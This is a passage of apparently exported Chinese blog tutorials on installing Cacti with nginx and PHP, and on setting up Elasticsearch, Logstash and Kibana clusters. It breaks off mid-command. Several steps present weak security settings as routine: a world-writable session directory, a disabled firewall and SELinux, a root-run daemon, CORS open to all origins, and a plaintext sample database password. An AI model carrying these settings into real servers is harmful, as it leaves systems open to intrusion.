php-cgi php-cli spawn-fcgi mysql-servermysql rrdtoolnet-snmp net-snmp-utils net-snmp-devel php-mysql php-snmp 6.配置PHP管理器 （1）cd /etc/sysconfig 进入sysconfig文件夹 （2）vi spawn-fcgi 在文件改位置添加如下命令 1234#SOCKET=/var/run/php-fcgi.sock#OPTIONS=\"-u apache -g apache -s $SOCKET -S -M 0600 -C 32 -F 1 -P /var/run/spawn-fcgi.pid -- /usr/bin/php-cgi\" SOCKET=/var/run/php-fcgi.sock OPTIONS=\"-u nginx -g nginx -s $SOCKET -S -M 0600 -C 32 -F 1 -P /var/run/spawn-fcgi.pid -- /usr/bin/php-cgi\" （3）/etc/init.d/spawn-fcgi restart 重启php管理器 （4）chkconfig spawn-fcgi on 设置开机启动服务 7.补充创建/var/lib/php下 session 目录 123mkdir -p /var/lib/php/sessionchown -R nginx.nginx /var/lib/php/sessionchmod 777 /var/lib/php/session 8.修改PHP文件配置 vi /etc/php.ini （1）修改PHP时区为Asia/ShangHai，在文件如下位置添加该句命令 12345678;;;;;;;;;;;;;;;;;;;; Module Settings ;;;;;;;;;;;;;;;;;;;;[Date]; Defines the default timezone used by the date functions; http://www.php.net/manual/en/datetime.configuration.php#ini.date.timezone;date.timezone =date.timezone = Asia/Shanghai （2）修改PHP调用内存限制，在文件如下位置修改如下添加： date.timezone = Asia/Shanghai memory_limit = 512M 123456789101112131415161718192021;;;;;;;;;;;;;;;;;;;; Resource Limits ;;;;;;;;;;;;;;;;;;;;; Maximum execution time of each script, in seconds; http://www.php.net/manual/en/info.configuration.php#ini.max-execution-timemax_execution_time = 30; Maximum amount of time each script may spend parsing request data. It's a good; idea to limit this time on productions servers in order to eliminate unexpectedly; long running scripts.; Default Value: -1 (Unlimited); Development Value: 60 (60 seconds); Production Value: 60 (60 seconds); http://www.php.net/manual/en/info.configuration.php#ini.max-input-timemax_input_time = 60; Maximum input variable nesting level; http://www.php.net/manual/en/info.configuration.php#ini.max-input-nesting-level;max_input_nesting_level = 64; Maximum amount of memory a script may consume (128MB); http://www.php.net/manual/en/ini.core.php#ini.memory-limit#memory_limit = 128Mmemory_limit = 512M 10.修改nginx配置文件增加对cacti的支持（对应自己的nginx安装目录）vi /usr/local/nginx/conf.d/nginx.conf在文件末尾大括号内添加如下配置 server { listen 8080; server_name 127.0.0.1; root html; index index.html index.php; location ~ \\.php$ { root html; fastcgi_buffer_size 128k; fastcgi_buffers 8 128k; fastcgi_pass unix:/var/run/php-fcgi.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; #fastcgi_param SCRIPT_FILENAME /usr/local/nginx/html/$fastcgi_script_name; include fastcgi_params; } } chkconfig nginx on 设置nginx开机启动 service nginx restart重启nginx服务 11.安装catic catic是无需编译安装的，直接下载其源包解压即可使用（1）下载cacti 12cd /tmpwget http://www.cacti.net/downloads/cacti-0.8.8b.tar.gz （2）解压cacti 12tar zxvf cacti-0.8.8b.tar.gzmv cacti-0.8.8b /usr/local/nginx/html #将解压出的cacti文件夹移动到nginx的 web目录下（对应自己安装的nginx） （3）修改cacti的使用者和组权限为nginx用户和nginx组 12cd /usr/local/nginx/htmlchown -R nginx:nginx cacti/ 12.创建数据库，存储cacti数据 123启动mysql/etc/init.d/mysqld startchkconfig mysqld on （1）使用root账户登录mysql mysql -uroot （2）创建cacti数据库表 create database cacti; （3）建立用户cacti，密码cacti123(可自行定义) mysql&gt; insert into mysql.user(host,user,password) values (&apos;localhost&apos;,&apos;cacti&apos;,password(&apos;cacti123&apos;)); （4）重载mysql授权表 mysql&gt; flush privileges; （5） 把数据库cacti授权于用户cacti mysql&gt; grant all on cacti.* to cacti@&apos;localhost&apos; identified by &apos;cacti123&apos;; mysql&gt; quit （6）将cacti数据库与mysql中的数据对应起来 cd /usr/local/nginx/html/cacti mysql -ucacti -pcacti123 cacti&lt;cacti.sql 13.修改CACTI配置文件 (1) 切换至cacti下的include目录（对应自己安装的nginx） cd /usr/local/nginx/html/cacti/include/ (2)编辑config.php文件，修改如下位置的配置 vi config.php 12345678/* make sure these values refect your actual database/host/user/password */$database_type = \"mysql\";$database_default = \"cacti\";#mysql数据库里所创建的表名$database_hostname = \"127.0.0.1\";$database_username = \"cacti\";#mysql数据库里为cacti数据表所创建的用户名$database_password = \"cacti123\";#mysql数据库里为cacti数据表所创建的密码$database_port = \"3306\";$database_ssl = false; 14.配置cacti的循环任务 12crontab -e*/5 * * * * php /usr/local/nginx/html/cacti/poller.php &gt; /dev/null 2&gt;&amp;1#请对应自己的nginx安装目录 :wq 保存退出 可直接先运行一遍php /usr/local/nginx/html/cacti/poller.php 好让cacti产生图片 1php /usr/share/nginx/html/cacti/poller.php 15.安装完成 使用浏览器打开如下地址http://本机IP/cacti/install 会显示安装向导，点击NEXT即可，到下面如下界面是，注意查看所有的文件路径是否都为绿色，不是绿色请找到自己安装的目录，一一对应点击Finsh即可到达cacti的登陆界面 输入用户名密码,cacti默认的用户名和密码都为admin，输入一次后会提示在一次输入，这个时候是让你设置新的admin密码.然后就能进入cacti的图形界面了. 点击左上角graphs，就能查看本机所监控的所有设备默认存在一个localhost，监控本机的内存使用，活动用户等信息.","link":"/2014/10/21/性能监控/cacti/了解Cacti监控安装与配置/"},{"title":"ELK(Elasticsearch1.7+ + Logstash1.5+ + Kibana4.1)搭建日志集中分析平台实践","text":"关注可参考：本文将安装Elasticsearch-1.7.2, Logstash-1.5.5, Kibana-4.1.5。 请注意版本要求，有些组件需要响应的版本要求。logstash是负责搜集和转发日志的，es用于存储和检索，kibana提供web端的展现…他们是独立运行的，也可以部署在同一台机器，也可以不同的机器。 可以关注我的Github上面有详细文档：https://github.com/yangcvo/ELK 启动脚本下载：https://github.com/yangcvo/ELK 详细配置优化做集群与写收集日志规则教程: https://github.com/yangcvo/ELK 组件预览 JDK http://www.oracle.com/technetwork/java/javase/downloads/index.html Elasticsearch https://www.elastic.co/downloads/elasticsearch Logstash https://www.elastic.co/downloads/logstash Kibana下载地址:https://www.elastic.co/downloads/kibana redis下载地址: http://redis.io/download 准备工作:服务端：系统centos 6.7 ip:192.168.1.234 JDK1.8 Elasticsearch-1.7.2 Kibana-4.1.2客户端：系统centos 6.7 ip:192.168.1.235 JDK1.8 Logash-1.4.2 基本配置设置FQDN：1234567891011121314151617181920创建SSL证书的时候需要配置FQDN#修改hostnamecat /etc/hostnameelk#修改hostscat /etc/hosts127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4::1 localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.1.234 elk.ooxx.com elk#刷新环境hostname -F /etc/hostname#复查结果hostname -felk.ooxx.comhostnameelk 关闭防火墙1234567891011#service iptables stop#setenforce 0不过这里我防火墙是开启的，后期添加出去端口即可。或者可以不关闭防火墙，但是要在iptables中打开相关的端口：# vim /etc/sysconfig/iptables-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 9200 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 9292 -j ACCEPT# service iptables restart 安装java：12345ElasticSearch和Logstash依赖于JDK，所以需要安装JDK：# yum -y install java-1.8.0-openjdk*# java -version这里我是用yum安装方法，也可以自行下载tar包，注意设置java路径。java也可到这个地址下载https://www.reucon.com/cdn/java/ 安装Elasticsearch：1234567891011121314151617RPM安装下载ElasticSearch ElasticSearch默认的对外服务的HTTP端口是9200，节点间交互的TCP端口是9300。.以 CentOS 下使用安装包RPM安装＃mkdir -p /opt/software &amp;&amp; cd /opt/software＃wget -c https://download.elastic.co/elasticsearch/elasticsearch/elasticsearch-1.7.2.noarch.rpm＃rpm -ivh elasticsearch-1.7.2.noarch.rpm可以自定义下存储文件目录 用RPM 安装。vim /etc/elasticsearch/elasticsearch.ymlcluster.name: graylog-developmentnode.data: trueindex.number_of_shards: 5index.number_of_replicas: 1path.data: /home/data/es-data 自定存储目录path.work: /home/data/es-worknetwork.host: 192.168.1.234 启动es相关服务12service elasticsearch startservice elasticsearch status es源码安装123456789101112131415这里我是源码安装的下载ElasticSearch ElasticSearch默认的对外服务的HTTP端口是9200，节点间交互的TCP端口是9300。Elasticsearch - https://www.elastic.co/downloads/elasticsearchtar -zxvf elasticsearch-1.7.1.tar.gz -C /usr/local/ cd /usr/local/elasticsearch-1.7.1/config/然后给目录做个软链接：ln -s elasticsearch-1.7.1/ /usr/local/elasticsearch这里需要修改配置文件：配置前先创建几个目录文件mkdir /data/es-data -p mkdir /data/es-work -p mkdir /usr/local/elasticsearch-1.7.1/config/logs mkdir /usr/local/elasticsearch-1.7.1/config/plugins 配置Elasticsearch：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566vim elasticsearch.ymlcluster.name: elasticsearch 集群名称 #################################### Node ###################################### Node names are generated dynamically on startup, so you're relieved# from configuring them manually. You can tie this node to a specific name:#node.name: “linux_es” 这里我做了集群所以需要两个节点，这里我写了一个节点名称# Every node can be configured to allow or deny being eligible as the master,# and to allow or deny to store the data.## Allow this node to be eligible as a master node (enabled by default):#node.master: true 集群master 启动## Allow this node to store data (enabled by default):#node.data: true 数据存放true# Set the number of shards (splits) of an index (5 by default):#index.number_of_shards: 5# Set the number of replicas (additional copies) of an index (1 by default):#index.number_of_replicas: 1#################################### Paths ##################################### Path to directory containing configuration (this file and logging.yml):#path.conf: /usr/local/elasticsearch/config 这里开启es配置文件目录路径# Path to directory where to store index data allocated for this node.#path.data: /data/es-data es数据存放目录 这里需要自己新建目录## Can optionally include more than one location, causing data to be striped across# the locations (a la RAID 0) on a file level, favouring locations with most free# space on creation. For example:##path.data: /path/to/data1,/path/to/data2# Path to temporary files:#path.work: /data/es-work # Path to log files:#path.logs: /usr/local/elasticsearch/logs es的存放日志 这里需要自己创建下文件# Path to where plugins are installed:#path.plugins: /usr/local/elasticsearch/plugins es安装插件存放路径## Set this property to true to lock the memory:#bootstrap.mlockall: true 源码安装启动需要执行 ：/usr/local/elasticsearch/bin/elasticsearch才能启动； 1234567891011121314151617181920212223242526272829303132333435这里需要/etc/init.d/创建启动脚本。可以到我github上面下载。[root@ELK elasticsearch-servicewrapper]# mv service/ /usr/local/elasticsearch/bin/[root@ELK elasticsearch-servicewrapper]# cd /usr/local/elasticsearch[root@ELK elasticsearch]# /usr/local/elasticsearch/bin/service/elasticsearch install 这里是安装esDetected RHEL or Fedora:Installing the Elasticsearch daemon..[root@ELK elasticsearch]# vim /etc/init.d/elasticsearch 查看安装es启动配置文件[root@ELK elasticsearch]# service elasticsearch start 启动es Starting Elasticsearch...Waiting for Elasticsearch......running: PID:31360 服务已启动了。启动相关服务service elasticsearch startservice elasticsearch status配置 elasticsearch 服务随系统自动启动# chkconfig --add elasticsearch测试ElasticSearch服务是否正常，预期返回200的状态码# curl -X GET http://localhost:9200&#123; \"name\" : \"elk\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"-4Rqn4IzS1GfnsodqZD8Tg\", \"version\" : &#123; \"number\" : \"1.7.2\", \"build_hash\" : \"d38a34e7b75af4e17ead16f156feffa432b22be3\", \"build_timestamp\" : \"2016-01-03T16:28:56Z\", \"build_snapshot\" : false, \"lucene_version\" : \"5.5.2\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; 安装 head、marvel、bigdesk插件:head插件123456789101112插件安装方法1：/usr/local/elasticsearch/bin/plugin -install mobz/elasticsearch-head重启es 即可。打开http://localhost:9200/_plugin/head/插件安装方法2：1.https://github.com/mobz/elasticsearch-head下载zip 解压2.建立/usr/local/elasticsearch/plugins/head/文件3.将解压后的elasticsearch-head-master文件夹下的文件copy到/usr/local/elasticsearch/plugins/head/重启es 即可。打开http://localhost:9200/_plugin/head/ Marvel插件123456789101112Elasticsearch 的集群和数据管理界面 Marvel 非常赞，可惜只对开发环境免费，参考链接：https://www.elastic.co/guide/en/marvel/current/configuration.html插件安装/usr/local/elasticsearch/bin/plugin -i elasticsearch/marvel/latest重启es 即可。完成后重启服务访问 http://192.168.1.234:9200/_plugin/marvel/如何看不到下面的页面，就修改下这里的参数看看有没有配置：vim elasticsearch.yml network.host: 192.168.1.234 在重启es 然后在查看就有数据。 bigdesk插件123456看需求安装功能: 监控查看cpu、内存使用情况,索引数据、搜索情况,http连接数等安装#/elstaicsearch/bin/plugin -i lukas-vlcek/bigdesk重启es 即可。完成后重启服务访问 http://192.168.1.234:9200/_plugin/bigdesk 安装Kibana:在es机器上面安装kibana. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134到https://www.elastic.co/downloads/kibana 找合适的版本。每个版本下面有这么一行内容，一定要注意这些内容：Compatible with Elasticsearch 1.4.4 - 1.7cd /opt/software/ &amp;&amp; wget https://download.elastic.co/kibana/kibana/kibana-4.1.2-linux-x64.tar.gz#解压＃tar zxvf kibana-4.1.2-linux-x64.tar.gz -C /usr/local ＃cd /usr/local/ &amp;&amp; mv kibana-4.1.2-linux-x64 kibana#创建kibana启动脚本服务vi /etc/rc.d/init.d/kibana#!/bin/bash### BEGIN INIT INFO# Provides: kibana# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: Runs kibana daemon# Description: Runs the kibana daemon as a non-root user### END INIT INFO# Process nameNAME=kibanaDESC=\"Kibana4\"PROG=\"/etc/init.d/kibana\"# Configure location of Kibana binKIBANA_BIN=/usr/local/kibana/bin# PID InfoPID_FOLDER=/var/run/kibana/PID_FILE=/var/run/kibana/$NAME.pidLOCK_FILE=/var/lock/subsys/$NAMEPATH=/bin:/usr/bin:/sbin:/usr/sbin:$KIBANA_BINDAEMON=$KIBANA_BIN/$NAME# Configure User to run daemon processDAEMON_USER=root# Configure logging locationKIBANA_LOG=/var/log/kibana.log# Begin ScriptRETVAL=0if [ `id -u` -ne 0 ]; then echo \"You need root privileges to run this script\" exit 1fi# Function library. /etc/init.d/functions start() &#123; echo -n \"Starting $DESC : \"pid=`pidofproc -p $PID_FILE kibana` if [ -n \"$pid\" ] ; then echo \"Already running.\" exit 0 else # Start Daemonif [ ! -d \"$PID_FOLDER\" ] ; then mkdir $PID_FOLDER fidaemon --user=$DAEMON_USER --pidfile=$PID_FILE $DAEMON 1&gt;\"$KIBANA_LOG\" 2&gt;&amp;1 &amp; sleep 2 pidofproc node &gt; $PID_FILE RETVAL=$? [[ $? -eq 0 ]] &amp;&amp; success || failureecho [ $RETVAL = 0 ] &amp;&amp; touch $LOCK_FILE return $RETVAL fi&#125;reload()&#123; echo \"Reload command is not implemented for this service.\" return $RETVAL&#125;stop() &#123; echo -n \"Stopping $DESC : \" killproc -p $PID_FILE $DAEMON RETVAL=$?echo [ $RETVAL = 0 ] &amp;&amp; rm -f $PID_FILE $LOCK_FILE&#125; case \"$1\" in start) start;; stop) stop ;; status) status -p $PID_FILE $DAEMON RETVAL=$? ;; restart) stop start ;; reload)reload;; *)# Invalid Arguments, print the following message. echo \"Usage: $0 &#123;start|stop|status|restart&#125;\" &gt;&amp;2exit 2 ;;esac#修改启动权限chmod +x /etc/rc.d/init.d/kibana#启动kibana服务service kibana startservice kibana status#查看端口netstat -nltpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 1765/java tcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 1765/java tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1509/sshd tcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 1876/node tcp 0 0 :::22 :::* LISTEN 1509/sshd 配置Kibana：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#编辑kibana.yaml 修改端口，设置host 可以设置本地服务器IPvi /usr/local/kibana/config/kibana.yml# Kibana is served by a back end server. This controls which port to use.port: 5601# The host to bind the server to.host: \"0.0.0.0\"# The Elasticsearch instance to use for all your queries.elasticsearch_url: \"http://localhost:9200\"# preserve_elasticsearch_host true will send the hostname specified in `elasticsearch`. If you set it to false,# then the host you use to connect to *this* Kibana instance will be sent.elasticsearch_preserve_host: true# Kibana uses an index in Elasticsearch to store saved searches, visualizations# and dashboards. It will create a new index if it doesn't already exist.kibana_index: \".kibana\"# If your Elasticsearch is protected with basic auth, this is the user credentials# used by the Kibana server to perform maintence on the kibana_index at statup. Your Kibana# users will still need to authenticate with Elasticsearch (which is proxied thorugh# the Kibana server)# kibana_elasticsearch_username: user# kibana_elasticsearch_password: pass# If your Elasticsearch requires client certificate and key# kibana_elasticsearch_client_crt: /path/to/your/client.crt# kibana_elasticsearch_client_key: /path/to/your/client.key# If you need to provide a CA certificate for your Elasticsarech instance, put# the path of the pem file here.# ca: /path/to/your/CA.pem# The default application to load.default_app_id: \"discover\"# Time in milliseconds to wait for elasticsearch to respond to pings, defaults to# request_timeout setting# ping_timeout: 1500# Time in milliseconds to wait for responses from the back end or elasticsearch.# This must be &gt; 0request_timeout: 300000# Time in milliseconds for Elasticsearch to wait for responses from shards.# Set to 0 to disable.shard_timeout: 0# Time in milliseconds to wait for Elasticsearch at Kibana startup before retrying# startup_timeout: 5000# Set to false to have a complete disregard for the validity of the SSL# certificate.verify_ssl: true# SSL for outgoing requests from the Kibana Server (PEM formatted)# ssl_key_file: /path/to/your/server.key# ssl_cert_file: /path/to/your/server.crt# Set the path to where you would like the process id file to be created.# pid_file: /var/run/kibana.pid# If you would like to send the log output to a file you can set the path below.# This will also turn off the STDOUT log output.# log_file: ./kibana.log# Plugins that are included in the build, and no longer found in the plugins/ folderbundled_plugin_ids:- plugins/dashboard/index- plugins/discover/index- plugins/doc/index- plugins/kibana/index- plugins/markdown_vis/index- plugins/metric_vis/index- plugins/settings/index- plugins/table_vis/index- plugins/vis_types/index- plugins/visualize/index 安装Logstash客户端：系统centos 6.7 ip:192.168.1.235 rpm安装12345678#下载rpm包wget https://download.elastic.co/logstash/logstash/packages/centos/logstash-1.5.4-1.noarch.rpm#安装yum localinstall logstash-1.5.4-1.noarch.rpm这里修改下hosts：vim /etc/hosts127.0.0.1 tomcat_A1 源码安装123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354我这里源码包安装# wget https://download.elasticsearch.org/logstash/logstash/logstash-1.5.1.tar.gz#curl -O https://download.elastic.co/logstash/logstash/logstash-1.5.4.tar.gz#tar -zxvf logstash-1.5.1.tar.gz#mv logstash-1.5.1 /usr/local/#ln -s /usr/local/logstash-1.5.1/ /usr/local/logstash下载启动脚本生产都是运行在后台的，我这里源码安装没有init脚本启动。 去Github下载 https://github.com/benet1006/ELK_config.git#cp logstash.init /etc/init.d/logstash#chmod +x /etc/init.d/logstash这个脚本我做过修改。#启动logstash服务service logstash startservice logstash status#查看5000端口netstat -nltpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 1765/javatcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 1765/javatcp 0 0 0.0.0.0:9301 0.0.0.0:* LISTEN 2309/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1509/sshdtcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 1876/nodetcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN 2309/javatcp 0 0 :::22 :::* LISTEN 1509/sshd修改启动脚本vim /etc/init.d/logstash 指定的目录自己源码安装的路径。name=logstashpidfile=\"/var/run/$name.pid\"export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarexport PATH=$PATH:$JAVA_HOME/binLS_USER=logstashLS_GROUP=logstashLS_HOME=/usr/local/logstash 安装路径LS_HEAP_SIZE=\"1000m\"LS_JAVA_OPTS=\"-Djava.io.tmpdir=$&#123;LS_HOME&#125;\"LS_LOG_DIR=/usr/local/logstashLS_LOG_FILE=\"$&#123;LS_LOG_DIR&#125;/$name.log\"LS_CONF_FILE=/etc/logstash.conf 收集日志的规则confLS_OPEN_FILES=16384LS_NICE=19LS_OPTS=\"\"https://www.elastic.co/guide/en/logstash/current/plugins-inputs-file.html这个是log stash的官方文档的配置说明。这个配置说明上面我先修改下我之前的配置文件。 logstash测试：1234将logstash.ooxx.com换成你自己的域名。同时，到域名解析那添加elk.ooxx.com的A记录。使用那种方式都行，不过如果logstash服务端的IP地址变换了，证书不可用了。这里查看日志有主机名返回不然就跟下面一样 host：0.0.0.0 1＃/usr/local/logstash/bin/logstash -e 'input &#123; stdin&#123; &#125; &#125; output &#123; stdout&#123;codec =&gt; rubydebug&#125; &#125;' 123456789101112131415161718192021配置log stash－实现系统日志收集inputvim /etc/logstash.conf 这里我们之间先创建一个.conf 我们写在／etc/ 编写好以后让logstash去调用。 input &#123; stdin &#123; &#125; &#125; output &#123; elasticsearch &#123; host =&gt; \"192.168.1.234\" protocol =&gt; \"http\" &#125; stdout &#123; codec =&gt; rubydebug &#125; &#125;然后在用logstash去调用/usr/local/logstash/bin/logstash -f /etc/logstash.conf vim /etc/logstash.conf 官方文档file的配置文件和类型。官方文档下面还有个这个从头读到尾这样规定，这个非常好，这里我在做修改。 1234567然后在启动log stash脚本.# /etc/init.d/logstash start## ps -ef | grep logstash启动完了以后在查看下／var/log/messages 然后在登陆到 http://192.168.1.234:9200/_plugin/head/ 扩展阅读CentOS 7.x安装ELK(Elasticsearch+Logstash+Kibana) Centos 6.5 安装nginx日志分析系统 elasticsearch + logstash + redis + kibana logstash-forwarder and grok examples Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2016/01/21/日志分析\u0010平台/Elasticsearch/ELK-Elasticsearch-Logstash-Kibana-搭建日志集中分析平台实践/"},{"title":"ElasticStack 5.x集群+Kibana-5.5.x+Logstash5.5+kafka2.10版本部署概述","text":"ElasticStack 5.x介绍前言ELK=ElasticSearch 官方博客:分布式以及 Elastic Elastic Stack是ELK日志系统的官方称呼，而ELK则是盛名在外的一款开源分布式日志系统，一般说来包括了Elasticsearch、Logstash和Kibana，涵盖了后端日志采集、日志搜索服务和前端数据展示等功能。本文将会对Elastic Stack的安装部署流程进行一系列简单的介绍，并记录下了一些部署过程中遇到的坑及解决方法。 对于一个软件或互联网公司来说，对计算资源和应用进行监控和告警是非常基础的需求。对于大公司或成熟公司，一个高度定制化的监控系统应该已经存在了很长时间并且非常成熟了。而对于一个初创公司或小公司来说，如何利用现有开源工具快速搭建一套日志监控及分析平台是需要探索的事情。 监控系统的用户： 运维，开发，产品 监控系统应该可以解决如下的问题： 监控server的各项基础指标，比如memory,cpu,load,network等 监控应用的状态。 搜集应用日志，并进行分析和统计。通过日志分析和统计可得到应用的访问统计，异常统计，业务统计。具有进行大规模日志数据的分析和处理能力。 可制定告警规则。各种监控数据进入系统后，可以根据条件触发告警，实时的将应用异常情况推送到运维、开发或业务人员的IM/SMS上。 可定制的看板。可以将各种实时统计或报表直观的显示出来。 可选方案：日志宝，日志易，Logtail(阿里云) 这是我们后面换 Graylog这个是一批黑马 也分享出来。 优势：使用简单劣势：需上传日志到外部，不灵活，不易扩展，需付费 flume-ng + kafka + spark streaming + hbase(es/mysql) + zepplin/自研web展示 优势：灵活，易于扩展，数据分析和处理能力强劣势：开发难度高，周期长，维护成本高 ELK优势和劣势：优势：开源成熟解决方案，使用简单，扩展能力强劣势：日志分析和处理依靠logstash完成，处理能力较低，无法适应复杂的日志分析场景结论：初步选择ELK搭建起监控平台，其能够满足当前较为简单的监控和分析需求。未来如果不能适应，再考虑其他方案。 在本次实践中，我们所部署的ELK分布式日志系统，其架构大致如下： 首先在各日志产生机上部署收集器Filebeat，然后Filebeat将监控到的log文件变化数据传至Kafka集群，Logstash负责将数据从kafka中拉取下来，并进行字段解析，向Elasticsearch输出结构化后的日志，Kibana负责将Elasticsearch中的数据进行可视化。 【重点参考】：ELK中文书 一、Elasticsearch集群1部署首先在https://www.elastic.co中找到ES的安装包。下文中所用的安装包均为Linux 64的tar.gz压缩包，解压即可用。官网安装方法:Installation example with tar 1234567curl -L -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.2.tar.gztar -xvf elasticsearch-5.5.2.tar.gzcd /usr/local/elasticsearch-5.5.2/binuseradd elasticsearch chown -R /usr/local/elasticsearch-5.5.2/su - elasticsearch -c \"/usr/local/elasticsearch-5.5.2/bin/elasticsearch -d\"这里我切换普通es用户启动，记得给予权限。 Elasticsearch至少需要Java 8。在撰写本文时，建议您使用Oracle JDK版本1.8.0_131。Java安装因平台而异，所以我们在这里不再赘述。Oracle的推荐安装文档可以在Oracle的网站上找到。在安装Elasticsearch之前，请先检查您的Java版本，然后再运行（如果需要，请相应地进行安装/升级）： 12java -versionecho $JAVA_HOME JVM参数设置 ElasticSearch5.0.0需要设置服务器max_map_countElasticSearch5.0.0要求最小为262144 默认内存是2G 这里我给6G内存. 1234567891011121314151617181920vim config/jvm.options-Xms6g-Xmx6g-XX:+UseConcMarkSweepGC-XX:CMSInitiatingOccupancyFraction=75-XX:+UseCMSInitiatingOccupancyOnly-XX:+AlwaysPreTouch-server-Xss1m-Djava.awt.headless=true-Dfile.encoding=UTF-8-Djna.nosys=true-Djdk.io.permissionsUseCanonicalPath=true-Dio.netty.noUnsafe=true-Dio.netty.noKeySetOptimization=true-Dio.netty.recycler.maxCapacityPerThread=0-Dlog4j.shutdownHookEnabled=false-Dlog4j2.disable.jmx=true-Dlog4j.skipJansi=true-XX:+HeapDumpOnOutOfMemoryError 1234567891011121314[root@logstash ~]# curl http://localhost:9200?pretty&#123; \"name\" : \"s-28M-e\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"0U3blQviRcSG_pq8KFQ5EA\", \"version\" : &#123; \"number\" : \"5.5.2\", \"build_hash\" : \"b2f0c09\", \"build_date\" : \"2017-08-14T12:33:14.154Z\", \"build_snapshot\" : false, \"lucene_version\" : \"6.6.0\" &#125;, \"tagline\" : \"You Know, for Search\"&#125; 1.1 Elasticsearch的配置ES的配置文件在解压根目录下的config文件夹中，其中elasticsearch.yml是主配置文件。以基本可用作为部署目标，在该文件中仅需要设置几个重要参数： cluster.name、node.name这两者顾名思义，作为集群和节点的标识符。 Paths部分下的path.data和path.logs，表示ES的数据存放位置，前者为数据存储位置，后者为ES的log存储位置。请尽量放到剩余空间足够的地方，此外在进行调优时有一种方法是将数据放置到SSD上。 bootstrap.memory_lock: true，设为true以确保ES拥有足够的JVM内存。 network.host: localhost和http.port，在此处设置ES对外服务的IP地址与端口设置完以上几项参数后，即可在ES根目录下使用命令./bin/elasticsearch启动ES进程。也有相应的后台启动方式，具体不赘述。 主要配置文件 1234567891011121314[elasticsearch@logstash elasticsearch-5.5.2]$ cat config/elasticsearch.yml | grep -Pv \"^$|^#\"cluster.name: jolly-clusternode.master: truenode.data: truenode.name: es-jollychic-node1path.data: /data/elasticsearch/es-datapath.logs: /data/elasticsearch/es-logsbootstrap.memory_lock: truebootstrap.system_call_filter: falsenetwork.host: 10.11.10.26,127.0.0.1http.port: 9200discovery.zen.ping.unicast.hosts: [\"10.11.10.26\", \"10.11.10.45\"]http.cors.enabled: truehttp.cors.allow-origin: \"*\" 修改Linux系统参数 1234567891011121314151617181920212223242526272829303132max file descriptors [4096] for elasticsearch process likely too low, increase to at least [65536]max number of threads [1024] for user [lishang] likely too low, increase to at least [2048]解决：切换到root用户，编辑limits.conf 添加类似如下内容vi /etc/security/limits.conf 添加如下内容:* soft nofile 65536* hard nofile 131072* soft nproc 2048* hard nproc 4096问题三：max number of threads [1024] for user [lish] likely too low, increase to at least [2048]解决：切换到root用户，进入limits.d目录下修改配置文件。vi /etc/security/limits.d/90-nproc.conf 修改如下内容：* soft nproc 1024#修改为* soft nproc 2048问题四：max virtual memory areas vm.max_map_count [65530] likely too low, increase to at least [262144]解决：切换到root用户修改配置sysctl.confvi /etc/sysctl.conf 添加下面配置：vm.max_map_count=655360并执行命令：sysctl -p然后，重新启动elasticsearch，即可启动成功。 集群健康检查 Cluster Health要检查群集的运行状况，我们将使用_catAPI。您可以在Kibana的控制台中运行以下命令，方法是 单击“查看控制台”或curl单击下面的“复制为CURL”链接并将其粘贴到终端中。 123curl -sXGET \"http://10.11.10.26:9200/_cat/health?v\"epoch timestamp cluster status node.total node.data shards pri relo init unassign pending_tasks max_task_wait_time active_shards_percent1509960188 17:23:08 jolly-cluster green 2 2 4081 3986 0 2 3889 0 - 100% 我们可以看到，我们的集群名为“elasticsearch”是绿色的。 每当我们要求群集健康，我们要么绿色，黄色，或红色。 绿色 - 一切都很好（集群功能齐全） 黄色 - 所有数据都可用，但一些副本尚未分配（群集完全可用） 红色 - 某些数据不管出于何种原因（群集部分功能） ####### ✨✨注意：当一个群集为红色时，它将继续提供来自可用碎片的搜索请求，但是您可能需要尽快修复它，因为有未分配的碎片。 查看集群中的节点列表： 123[root@logstash ~]# curl -XGET http://10.11.10.26:9200/_cat/nodes?vip heap.percent ram.percent cpu load_1m load_5m load_15m node.role master name10.11.10.26 51 96 18 5.02 5.60 3.58 mdi * es-jollychic-node1 创建索引：第一个命令使用PUT创建了一个叫做“customer”的索引。我们简单地将pretty附加到调用的尾部，使其以美观的形式打印出JSON响应 1curl -XPUT 'http://10.11.10.26:9200/customer?pretty' 12345[root@logstash ~]# curl -XGET 